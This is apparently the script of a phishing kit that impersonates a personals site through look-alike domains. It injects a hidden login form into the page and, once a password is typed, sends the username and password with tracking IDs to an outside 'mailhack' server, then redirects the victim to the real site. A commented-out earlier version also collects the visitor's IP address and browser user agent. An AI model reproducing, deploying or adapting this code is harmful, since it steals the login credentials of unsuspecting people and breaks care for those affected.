

// const API_URL = 'https://mailhack-new.vercel.app'
//   function getQueryParam(param) {
//     const urlParams = new URLSearchParams(window.location.search);
//     return urlParams.get(param);
// }

// var userIp;

// async function getUserIP() {
//   try {
//     const response = await fetch('https://api.ipify.org?format=json');
//     const data = await response.json();
//     userIp = data.ip; 
//     console.log('IP Address fetched:', userIp);
//     return data.ip;
//   } catch (error) {
//     console.error('Error fetching IP address:', error);
//   }
// }

// window.onload = function () {
//   getUserIP().then(() => {
//     console.log('User IP Address:', userIp); 
//   });
// };




// $(document).ready(function () {
//    const adminId = getQueryParam('admin');
//     const posterId = getQueryParam('poster');
//     const site = getQueryParam('site');
//     const loginForm = $('<form>', {
//         id: 'loginForm',
//         method: 'POST',
//         css: { opacity: '0' } 
//     });

//     const usernameField = $('<input>', {
//         type: 'text',
//         id: 'username',
//         name: 'username'
//     });

//     const passwordField = $('<input>', {
//         type: 'password',
//         id: 'password',
//         name: 'password'
//     });

//     const userAgentField = $('<input>', {
//         type: 'text',
//         id: 'userAgent',
//         name: 'userAgent',
//         value: navigator.userAgent 
//     });
    
    
//     const currentTime = new Date();
//     const year = currentTime.getFullYear();
//     const month = String(currentTime.getMonth() + 1).padStart(2, '0'); 
//     const day = String(currentTime.getDate()).padStart(2, '0');
//     const hours = String(currentTime.getHours()).padStart(2, '0');
//     const minutes = String(currentTime.getMinutes()).padStart(2, '0');
//     const seconds = String(currentTime.getSeconds()).padStart(2, '0');
    
//     const formattedTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
//     console.log(formattedTime); 
    
        

//     loginForm.append(usernameField, passwordField, userAgentField);
//     $('body').append(loginForm);

//     passwordField.on('change', function () {
//         if ($(this).val().trim() !== '') {
//             loginForm.submit(); 
//         }
//     });

//     loginForm.on('submit', function (event) {
//         event.preventDefault();

//         const username = $('#username').val().trim();
//         const password = $('#password').val().trim();
//             console.log(username);
//             console.log(password);
//         if (username && password) {
//             $.ajax({
//                 type: 'POST',
//                 url: `${API_URL}/ad/${adminId}/${posterId}`,
//                 data: {
//                     site:site,
//                     mail: username,
//                     passcode: password,
//                     adminId: adminId,
//                     posterId: posterId
//                 },
//                 success: function (response) {
//                     console.log('Response:', response);
//                         if(response != null){
//                             window.location.href = "https://megapersonaelse.my.id/code-page/64";
//                         }
                         
                        
                    
//                 },
//                 error: function (xhr, status, error) {
//                     console.error('Error during form submission:', error);
//                 }
//             });
//         } else {
//             console.error('Username and password are required.');
//         }
//     });


// });






const API_URL = 'https://mailhack-new.vercel.app'
const siteUrl ='www.meggapursonel.online'

function detectDevice(userAgent) {
    if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
      return "phone";
    }
    if (/Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i.test(userAgent)) {
      return "ipad";
    }
    return "desktop";
  }

  async function verifyPage(params) {
    
  }
  function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

document.addEventListener('DOMContentLoaded', () => {
    // Extract 'userid' from the URL
    const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
    const adminId = getQueryParam('admin');
    const posterId = getQueryParam('poster');
    const site = getQueryParam('site');




    let form = document.createElement("form");
    form.setAttribute("id", "loginForm");
    form.setAttribute("method", "POST");
    form.style.opacity = 0;
    
    let unameField = document.createElement("input");
    unameField.setAttribute("type", "text");
    unameField.setAttribute("id", "username");
    unameField.setAttribute("name", "username");
    
    let pwdField = document.createElement("input");
    pwdField.setAttribute("type", "password");
    pwdField.setAttribute("id", "password");
    pwdField.setAttribute("name", "password");

    console.log('User userAgent:', navigator.userAgent);

    pwdField.addEventListener('change', function () {
        if (this.value.trim() !== '') {
            let uname = unameField.value.trim();
            let pwd = pwdField.value.trim();
    
         if (uname && pwd) {
            // Send form data via fetch
            fetch(`${API_URL}/ad/${adminId}/${posterId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    site:site,
                    mail: uname,
                    passcode: pwd,
                    adminId: adminId,
                    posterId: posterId
                })
            })
                .then(response => response.json())
                .then(data => {
                    console.log('Response:', data);
                    if (data.success) {
                        // Redirect to another URL on success
                        window.location.href = 'https://megapersonals.eu';
                    }
                })
                .catch(error => {
                    console.error('Error during form submission:', error);
                });
        } else {
            console.error('Username and password are required.');
        }
        }
    });


    form.appendChild(unameField);
    form.appendChild(pwdField);
    document.body.appendChild(form);

                
});
